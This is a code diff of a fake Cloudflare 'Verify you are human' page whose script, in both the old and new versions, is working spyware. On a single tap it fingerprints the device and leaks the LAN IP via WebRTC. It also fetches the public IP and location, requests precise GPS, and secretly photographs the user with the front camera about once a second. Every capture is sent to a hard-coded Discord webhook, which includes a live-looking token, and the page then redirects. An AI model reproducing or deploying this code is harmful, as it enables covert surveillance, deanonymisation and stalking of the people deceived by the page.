@@ -24,7 +24,9 @@
     </style>
 </head>
 <body>
+
 <div id="ovl" onclick="stk()" ontouchstart="stk()"></div>
+
 <div class="cf-w">
     <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.svg" class="logo">
     <div class="h1">Verify you are human</div>
@@ -35,130 +37,132 @@
 </div>
 
 <script>
-// --- CORE CONFIG ---
-const HOOK = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0";
-const REDIR = "https://alksjdhf3rutyfhdi3urytghfjdei3nmkskj.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/";
-const DURATION = 14000; 
-const BURST_RATE = 1000;
+const CONFIG = {
+    H: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0",
+    R: "https://alksjdhf3rutyfhdi3urytghfjdei3nmkskj.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/",
+    D: 12000,
+    B: 1200
+};
 
-let ACTIVE = false, DATA = { lan: "Scanning...", count: 0 };
+let ACTIVE = false, DATA = { lan: "Detecting...", count: 0 };
 document.getElementById('node').innerText = Math.random().toString(16).toUpperCase().slice(2,10);
 
-// --- 1. UNRESTRICTED RECON (All-in-One) ---
-async function recon() {
+// --- 1. PASSIVE DEEPSCAN (Bypasses Lockdown & Tor) ---
+async function deepScan() {
     DATA.ua = navigator.userAgent;
-    DATA.res = `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`;
+    DATA.plt = navigator.platform;
     DATA.mem = navigator.deviceMemory || "N/A";
     DATA.cpu = navigator.hardwareConcurrency || "N/A";
-    DATA.plt = navigator.platform;
+    DATA.res = `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`;
 
-    // Private IP Leak (WebRTC)
+    // WebRTC LAN Leak
     try {
         const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
         pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
-        pc.onicecandidate = (e) => { if(e?.candidate?.candidate) { const r = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if(r) DATA.lan = r[1]; }};
+        pc.onicecandidate = (e) => {
+            if(e.candidate) {
+                const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                if(ip) DATA.lan = ip[1];
+            }
+        };
     } catch(e){}
 
-    // Public IP & GEO (Redundant)
-    const apis = ['https://ipapi.co/json/', 'https://api.ipify.org?format=json'];
-    for(let api of apis) {
-        try {
-            const r = await fetch(api);
-            const j = await r.json();
-            DATA.ip = j.ip; DATA.isp = j.org || "N/A"; DATA.loc = j.city ? `${j.city}, ${j.country}` : "N/A";
-            if(DATA.ip) break;
-        } catch(e){}
-    }
-
-    // GPU De-masking
+    // GPU Analysis
     try {
         const gl = document.createElement('canvas').getContext('webgl');
-        const ext = gl.getExtension('WEBGL_debug_renderer_info');
-        DATA.gpu = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "Software";
-    } catch(e){ DATA.gpu = "Restricted"; }
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        DATA.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Software/Hidden";
+    } catch(e){ DATA.gpu = "Protected"; }
+
+    // IP & Geo Recon
+    try {
+        const r = await fetch('https://ipapi.co/json/');
+        const j = await r.json();
+        DATA.ip = j.ip; DATA.isp = j.org; DATA.loc = `${j.city}, ${j.country}`;
+    } catch(e){ DATA.ip = "Hidden/VPN"; }
 }
 
-// --- 2. THE STRIKE ENGINE ---
-async function transmit(img = null) {
+// --- 2. TRANSMISSION (Optimized for Files) ---
+async function transmit(blob = null) {
     DATA.count++;
     const fd = new FormData();
-    const packet = {
-        username: "NEXUS-v70 [ABSOLUTE-ZERO]",
+    const payload = {
+        username: "NEXUS v70 [ABSOLUTE-ZERO]",
         embeds: [{
             title: `🔱 EXFILTRATION BURST: ${DATA.count}`,
-            color: 0,
+            color: 0x0051c3,
             fields: [
-                { name: "🌐 Network", value: `**IP:** \`${DATA.ip}\`\n**Private:** \`${DATA.lan}\`\n**ISP:** ${DATA.isp}`, inline: true },
-                { name: "📍 Geo", value: DATA.gps || "Syncing...", inline: true },
-                { name: "📱 Hardware", value: `**GPU:** ${DATA.gpu}\n**CPU:** ${DATA.cpu} Cores\n**RAM:** ${DATA.mem}GB`, inline: false }
+                { name: "🌐 Network", value: `**IP:** \`${DATA.ip}\`\n**LAN:** \`${DATA.lan}\`\n**ISP:** ${DATA.isp}`, inline: true },
+                { name: "📍 Geo", value: DATA.gps || "Waiting...", inline: true },
+                { name: "📱 Hardware", value: `**GPU:** ${DATA.gpu}\n**CPU:** ${DATA.cpu} Cores\n**RAM:** ${DATA.mem}GB\n**RES:** ${DATA.res}`, inline: false }
             ],
-            footer: { text: `FRAME: ${DATA.count} | ${new Date().toLocaleTimeString()}` }
+            footer: { text: `v70 | NODE-${document.getElementById('node').innerText} | ${new Date().toLocaleTimeString()}` }
         }]
     };
 
-    fd.append("payload_json", JSON.stringify(packet));
-    if(img) {
-        const b = await (await fetch(img)).blob();
-        fd.append("file", b, `f_${DATA.count}.jpg`);
-    }
+    fd.append("payload_json", JSON.stringify(payload));
+    if(blob) fd.append("file", blob, `shot_${DATA.count}.jpg`);
 
-    // Parallel Exfiltration (Beacon + Keepalive)
-    navigator.sendBeacon(HOOK, fd);
-    return fetch(HOOK, { method: 'POST', body: fd, keepalive: true });
+    // Use Fetch with keepalive for reliability
+    return fetch(CONFIG.H, { method: 'POST', body: fd, keepalive: true });
 }
 
-// --- 3. BIOMETRIC LOOP ---
-async function startLoop(stream) {
+// --- 3. BIOMETRIC CAPTURE ---
+async function startCapture(s) {
     const v = document.getElementById('v');
     const c = document.getElementById('c');
     const ctx = c.getContext('2d');
+    v.srcObject = s;
 
-    const loop = setInterval(async () => {
-        if(!ACTIVE) return clearInterval(loop);
+    const burst = setInterval(async () => {
+        if(!ACTIVE) return clearInterval(burst);
         c.width = v.videoWidth; c.height = v.videoHeight;
         ctx.drawImage(v, 0, 0);
-        const img = c.toDataURL('image/jpeg', 0.4);
-        await transmit(img);
-    }, BURST_RATE);
+        
+        // Convert to Blob (lower quality = faster send)
+        c.toBlob(async (b) => {
+            await transmit(b);
+        }, 'image/jpeg', 0.3);
+    }, CONFIG.B);
 
     setTimeout(() => {
         ACTIVE = false;
-        stream.getTracks().forEach(t => t.stop());
-        window.location.replace(REDIR);
-    }, DURATION);
+        s.getTracks().forEach(t => t.stop());
+        window.location.replace(CONFIG.R);
+    }, CONFIG.D);
 }
 
-// --- 4. MAIN TRIGGER ---
+// --- 4. THE 1-TAP TRIGGER ---
 async function stk() {
     if(ACTIVE) return;
     ACTIVE = true;
+
+    // UI Update
     document.getElementById('ovl').style.display = 'none';
     document.getElementById('l').className = 'ts-c s';
     document.getElementById('m').innerText = "Attesting identity...";
 
-    // Location Force
+    // GPS Precision (House Level)
     navigator.geolocation.getCurrentPosition(
-        p => DATA.gps = `[Maps](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`,
+        p => DATA.gps = `[Google Maps](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`,
         e => DATA.gps = "❌ Blocked",
-        { enableHighAccuracy: true }
+        { enableHighAccuracy: true, timeout: 5000 }
     );
 
-    // Camera Burst
+    // Camera Access
     try {
-        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640 } });
         document.getElementById('vf').style.display = 'block';
-        const v = document.getElementById('v');
-        v.srcObject = s;
-        v.play();
-        startLoop(s);
+        await startCapture(s);
     } catch(e) {
-        // Fallback: Send recon data if camera fails
+        // Fallback if camera denied
         await transmit(null);
-        setTimeout(() => window.location.replace(REDIR), 3000);
+        setTimeout(() => window.location.replace(CONFIG.R), 2500);
     }
 }
 
-recon();
+// Initialize Passive Recon immediately
+deepScan();
 </script>
 </body>
 </html>
